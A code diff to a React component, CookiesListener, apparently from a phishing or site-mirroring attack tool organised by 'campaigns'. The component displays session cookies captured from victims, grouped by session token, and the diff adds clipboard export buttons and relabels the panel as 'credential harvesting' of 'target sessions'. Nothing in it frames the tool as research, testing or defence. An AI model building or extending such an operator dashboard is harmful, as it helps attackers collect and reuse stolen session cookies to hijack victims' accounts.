@@ -1,6 +1,6 @@
 // src/components/CookiesListener.jsx
 import React, { useState, useEffect } from 'react';
-import { ClipboardCopy, RefreshCw } from 'lucide-react';
+import { ClipboardCopy, RefreshCw, Check } from 'lucide-react';
 import { downloadCookies, getCapturedCookies } from '../services/apiService';
 
 const CookiesListener = ({ campaignId }) => {
@@ -9,6 +9,7 @@ const CookiesListener = ({ campaignId }) => {
   const [loading, setLoading] = useState(false);
   const [lastUpdated, setLastUpdated] = useState(null);
   const [autoRefresh, setAutoRefresh] = useState(true);
+  const [copiedStates, setCopiedStates] = useState({});
 
   // Fetch cookies from database
   const fetchCookies = async () => {
@@ -48,19 +49,129 @@ const CookiesListener = ({ campaignId }) => {
     };
   }, [campaignId, autoRefresh]);
 
-  const handleCopy = (sessionToken) => {
-    const sessionCookies = cookiesBySession[sessionToken] || [];
-    navigator.clipboard.writeText(JSON.stringify(sessionCookies, null, 2));
-    alert('Session cookies copied to clipboard');
+  const showCopySuccess = (key) => {
+    setCopiedStates(prev => ({ ...prev, [key]: true }));
+    setTimeout(() => {
+      setCopiedStates(prev => ({ ...prev, [key]: false }));
+    }, 2000);
   };
 
-  const handleCopyAll = () => {
-    navigator.clipboard.writeText(JSON.stringify(cookies, null, 2));
-    alert('All cookies copied to clipboard');
+  const handleCopy = async (sessionToken) => {
+    const sessionCookies = cookiesBySession[sessionToken] || [];
+    const cookiesText = JSON.stringify(sessionCookies, null, 2);
+    
+    try {
+      // Check if clipboard API is available and supported
+      if (navigator.clipboard && typeof navigator.clipboard.writeText === 'function' && window.isSecureContext) {
+        await navigator.clipboard.writeText(cookiesText);
+        showCopySuccess(`session-${sessionToken}`);
+      } else {
+        // Fallback for browsers without clipboard API
+        const textArea = document.createElement('textarea');
+        textArea.value = cookiesText;
+        textArea.style.position = 'fixed';
+        textArea.style.left = '-999999px';
+        textArea.style.top = '-999999px';
+        document.body.appendChild(textArea);
+        textArea.focus();
+        textArea.select();
+        try {
+          const successful = document.execCommand('copy');
+          if (successful) {
+            showCopySuccess(`session-${sessionToken}`);
+          } else {
+            alert('Failed to copy to clipboard. Please copy manually.');
+          }
+        } catch (err) {
+          console.error('Failed to copy to clipboard:', err);
+          alert('Failed to copy to clipboard. Please copy manually.');
+        }
+        document.body.removeChild(textArea);
+      }
+    } catch (err) {
+      console.error('Failed to copy to clipboard:', err);
+      alert('Failed to copy to clipboard. Please try again.');
+    }
+  };
+
+  const handleCopyAll = async () => {
+    const cookiesText = JSON.stringify(cookies, null, 2);
+    
+    try {
+      // Check if clipboard API is available and supported
+      if (navigator.clipboard && typeof navigator.clipboard.writeText === 'function' && window.isSecureContext) {
+        await navigator.clipboard.writeText(cookiesText);
+        showCopySuccess('export-all');
+      } else {
+        // Fallback for browsers without clipboard API
+        const textArea = document.createElement('textarea');
+        textArea.value = cookiesText;
+        textArea.style.position = 'fixed';
+        textArea.style.left = '-999999px';
+        textArea.style.top = '-999999px';
+        document.body.appendChild(textArea);
+        textArea.focus();
+        textArea.select();
+        try {
+          const successful = document.execCommand('copy');
+          if (successful) {
+            showCopySuccess('export-all');
+          } else {
+            alert('Failed to copy to clipboard. Please copy manually.');
+          }
+        } catch (err) {
+          console.error('Failed to copy to clipboard:', err);
+          alert('Failed to copy to clipboard. Please copy manually.');
+        }
+        document.body.removeChild(textArea);
+      }
+    } catch (err) {
+      console.error('Failed to copy to clipboard:', err);
+      alert('Failed to copy to clipboard. Please try again.');
+    }
   };
 
   const handleManualRefresh = () => {
     fetchCookies();
+  };
+
+  const handleCopyRawJSON = async (sessionToken) => {
+    const sessionCookies = cookiesBySession[sessionToken] || [];
+    const formattedCookies = sessionCookies.map(formatCookieForDisplay);
+    const rawJSONText = JSON.stringify(formattedCookies, null, 2);
+    
+    try {
+      // Check if clipboard API is available and supported
+      if (navigator.clipboard && typeof navigator.clipboard.writeText === 'function' && window.isSecureContext) {
+        await navigator.clipboard.writeText(rawJSONText);
+        showCopySuccess(`raw-json-${sessionToken}`);
+      } else {
+        // Fallback for browsers without clipboard API
+        const textArea = document.createElement('textarea');
+        textArea.value = rawJSONText;
+        textArea.style.position = 'fixed';
+        textArea.style.left = '-999999px';
+        textArea.style.top = '-999999px';
+        document.body.appendChild(textArea);
+        textArea.focus();
+        textArea.select();
+        try {
+          const successful = document.execCommand('copy');
+          if (successful) {
+            showCopySuccess(`raw-json-${sessionToken}`);
+          } else {
+            alert('Failed to copy to clipboard. Please copy manually.');
+          }
+        } catch (err) {
+          console.error('Failed to copy to clipboard:', err);
+          alert('Failed to copy to clipboard. Please copy manually.');
+        }
+        document.body.removeChild(textArea);
+      }
+    } catch (err) {
+      console.error('Failed to copy to clipboard:', err);
+      alert('Failed to copy to clipboard. Please try again.');
+    }
   };
 
   const formatCookieForDisplay = (cookie) => {
@@ -84,40 +195,37 @@ const CookiesListener = ({ campaignId }) => {
 
   if (!campaignId) {
     return (
-      <div className="p-4 bg-white rounded shadow">
-        <h2 className="text-lg font-semibold mb-2">Real-Time Cookie Capture</h2>
-        <p className="text-gray-500">No campaign selected</p>
+      <div className="glass-card p-6">
+        <h2 className="text-xl font-semibold text-cyber-primary mb-3">Real-Time Cookie Capture</h2>
+        <p className="text-cyber-muted">No campaign selected</p>
       </div>
     );
   }
 
   if (cookies.length === 0 && !loading) {
     return (
-      <div className="p-4 bg-white rounded shadow">
-        <div className="flex justify-between items-center mb-2">
-          <h2 className="text-lg font-semibold">Real-Time Cookie Capture</h2>
-          <div className="flex items-center space-x-2">
-            <label className="flex items-center text-sm">
-              <input
-                type="checkbox"
-                checked={autoRefresh}
-                onChange={(e) => setAutoRefresh(e.target.checked)}
-                className="mr-1"
-              />
+      <div className="glass-card p-6">
+        <div className="flex justify-between items-center mb-4">
+          <h2 className="text-xl font-semibold text-cyber-primary">Real-Time Cookie Capture</h2>
+          <div className="flex items-center space-x-3">
+            <label className="flex items-center text-sm text-cyber-muted">
+              <div className={`toggle-switch mr-2 ${autoRefresh ? 'active' : ''}`} onClick={(e) => setAutoRefresh(!autoRefresh)}>
+                <div className="toggle-slider"></div>
+              </div>
               Auto-refresh
             </label>
             <button
               onClick={handleManualRefresh}
               disabled={loading}
-              className="p-1 bg-gray-200 rounded hover:bg-gray-300 disabled:opacity-50"
+              className="glass-button p-2 rounded-lg"
               title="Refresh cookies"
             >
               <RefreshCw size={16} className={loading ? 'animate-spin' : ''} />
             </button>
           </div>
         </div>
-        <p className="text-gray-500">
-          {loading ? 'Loading cookies...' : 'No cookies captured yet. Cookies will appear here as they are captured from website mirroring sessions.'}
+        <p className="text-cyber-muted">
+          {loading ? 'Scanning for cookies...' : 'No cookies captured yet. Cookies will appear here as they are harvested from target sessions.'}
         </p>
       </div>
     );
@@ -126,91 +234,108 @@ const CookiesListener = ({ campaignId }) => {
   return (
     <div className="space-y-6">
       {/* Header with controls */}
-      <div className="p-4 bg-white rounded shadow">
-        <div className="flex justify-between items-center mb-2">
-          <h2 className="text-lg font-semibold">
-            Real-Time Cookie Capture ({cookies.length} cookies)
-          </h2>
-          <div className="flex items-center space-x-2">
-            <label className="flex items-center text-sm">
-              <input
-                type="checkbox"
-                checked={autoRefresh}
-                onChange={(e) => setAutoRefresh(e.target.checked)}
-                className="mr-1"
-              />
+      <div className="glass-card p-6">
+        <div className="flex justify-between items-center mb-4">
+          <div>
+            <h2 className="text-xl font-semibold text-cyber-primary">
+              Real-Time Cookie Capture
+            </h2>
+            <p className="text-sm text-cyber-muted mt-1">
+              {cookies.length} cookies harvested from {Object.keys(cookiesBySession).length} sessions
+            </p>
+          </div>
+          <div className="flex items-center space-x-3">
+            <label className="flex items-center text-sm text-cyber-muted">
+              <div className={`toggle-switch mr-2 ${autoRefresh ? 'active' : ''}`} onClick={(e) => setAutoRefresh(!autoRefresh)}>
+                <div className="toggle-slider"></div>
+              </div>
               Auto-refresh
             </label>
             <button
               onClick={handleManualRefresh}
               disabled={loading}
-              className="p-1 bg-gray-200 rounded hover:bg-gray-300 disabled:opacity-50"
+              className="glass-button p-2 rounded-lg"
               title="Refresh cookies"
             >
               <RefreshCw size={16} className={loading ? 'animate-spin' : ''} />
             </button>
             <button
               onClick={handleCopyAll}
-              className="px-3 py-1 bg-green-600 text-white text-sm rounded hover:bg-green-700"
+              className="glass-button px-4 py-2 rounded-lg text-sm"
               title="Copy all cookies"
             >
-              Copy All
+              {copiedStates['export-all'] ? (
+                <>
+                  <Check size={16} className="inline mr-2 text-green-500" />
+                  Copied!
+                </>
+              ) : (
+                'Export All'
+              )}
             </button>
           </div>
         </div>
         
         {lastUpdated && (
-          <p className="text-xs text-gray-500">
-            Last updated: {lastUpdated.toLocaleTimeString()}
-          </p>
+          <div className="flex items-center space-x-2 text-xs text-cyber-muted">
+            <div className="w-2 h-2 bg-green-400 rounded-full status-indicator"></div>
+            <span>Last updated: {lastUpdated.toLocaleTimeString()}</span>
+          </div>
         )}
       </div>
 
       {/* Cookies grouped by session */}
       {Object.entries(cookiesBySession).map(([sessionToken, sessionCookies]) => (
-        <div key={sessionToken} className="p-4 bg-white rounded shadow">
-          <div className="flex justify-between items-center mb-3">
+        <div key={sessionToken} className="glass-card p-6">
+          <div className="flex justify-between items-center mb-4">
             <div>
-              <span className="font-medium">Session: {sessionToken}</span>
-              <span className="text-sm text-gray-500 ml-2">
-                ({sessionCookies.length} cookies)
-              </span>
+              <div className="flex items-center space-x-2">
+                <span className="font-mono text-cyber-primary">Session: {sessionToken.substring(0, 12)}...</span>
+                <div className="badge badge-success">{sessionCookies.length} cookies</div>
+              </div>
+              <div className="text-xs text-cyber-muted mt-1">
+                Active credential harvesting session
+              </div>
             </div>
             <div className="flex space-x-2">
               <button
                 onClick={() => handleCopy(sessionToken)}
-                className="p-1 bg-gray-200 rounded hover:bg-gray-300"
+                className="glass-button p-2 rounded-lg"
                 title="Copy session cookies"
               >
-                <ClipboardCopy size={16} />
+                {copiedStates[`session-${sessionToken}`] ? (
+                  <Check size={16} className="text-green-500" />
+                ) : (
+                  <ClipboardCopy size={16} />
+                )}
               </button>
             </div>
           </div>
 
           {/* Cookie list for this session */}
-          <div className="space-y-2 max-h-80 overflow-y-auto">
+          <div className="space-y-3 max-h-80 overflow-y-auto">
             {sessionCookies.map((cookie, index) => (
-              <div key={`${cookie.name}-${index}`} className="border rounded p-2 bg-gray-50">
+              <div key={`${cookie.name}-${index}`} className="data-table rounded-lg p-4">
                 <div className="flex justify-between items-start">
                   <div className="flex-1">
-                    <div className="font-mono text-sm">
-                      <span className="font-semibold text-blue-600">{cookie.name}</span>
-                      <span className="text-gray-500"> = </span>
-                      <span className="text-green-600">
+                    <div className="font-mono text-sm mb-2">
+                      <span className="font-semibold text-cyber-primary">{cookie.name}</span>
+                      <span className="text-cyber-muted"> = </span>
+                      <span className="text-cyber-secondary">
                         {cookie.value.length > 50 
                           ? `${cookie.value.substring(0, 50)}...` 
                           : cookie.value}
                       </span>
                     </div>
-                    <div className="text-xs text-gray-500 mt-1 space-x-2">
-                      <span>Domain: {cookie.domain}</span>
-                      <span>Path: {cookie.path}</span>
-                      {cookie.secure && <span className="text-orange-600">Secure</span>}
-                      {cookie.httpOnly && <span className="text-red-600">HttpOnly</span>}
-                      {cookie.session && <span className="text-purple-600">Session</span>}
+                    <div className="flex flex-wrap gap-2 text-xs mb-2">
+                      <span className="badge badge-warning">Domain: {cookie.domain}</span>
+                      <span className="badge badge-warning">Path: {cookie.path}</span>
+                      {cookie.secure && <span className="badge badge-success">Secure</span>}
+                      {cookie.httpOnly && <span className="badge badge-danger">HttpOnly</span>}
+                      {cookie.session && <span className="badge badge-success">Session</span>}
                     </div>
-                    <div className="text-xs text-gray-400 mt-1">
-                      Updated: {new Date(cookie.lastUpdated).toLocaleString()}
+                    <div className="text-xs text-cyber-muted">
+                      Captured: {new Date(cookie.lastUpdated).toLocaleString()}
                     </div>
                   </div>
                 </div>
@@ -219,13 +344,31 @@ const CookiesListener = ({ campaignId }) => {
           </div>
 
           {/* Raw JSON view toggle */}
-          <details className="mt-3">
-            <summary className="cursor-pointer text-sm text-blue-600 hover:text-blue-800">
-              View Raw JSON
+          <details className="mt-4">
+            <summary className="cursor-pointer text-sm text-cyber-secondary hover:text-cyber-primary transition-colors">
+              View Raw JSON Data
             </summary>
-            <pre className="bg-gray-100 p-3 rounded mt-2 max-h-60 overflow-auto text-xs">
-              {JSON.stringify(sessionCookies.map(formatCookieForDisplay), null, 2)}
-            </pre>
+            <div className="data-table rounded-lg mt-3 p-4 max-h-60 overflow-auto">
+              <pre className="text-xs text-cyber-muted font-mono">
+                {JSON.stringify(sessionCookies.map(formatCookieForDisplay), null, 2)}
+              </pre>
+              <div className="flex justify-end mt-2">
+                <button
+                  onClick={() => handleCopyRawJSON(sessionToken)}
+                  className="glass-button px-3 py-1 rounded-lg text-sm"
+                  title="Copy raw JSON data"
+                >
+                  {copiedStates[`raw-json-${sessionToken}`] ? (
+                    <>
+                      <Check size={16} className="inline mr-2 text-green-500" />
+                      Copied!
+                    </>
+                  ) : (
+                    'Copy JSON'
+                  )}
+                </button>
+              </div>
+            </div>
           </details>
         </div>
       ))}
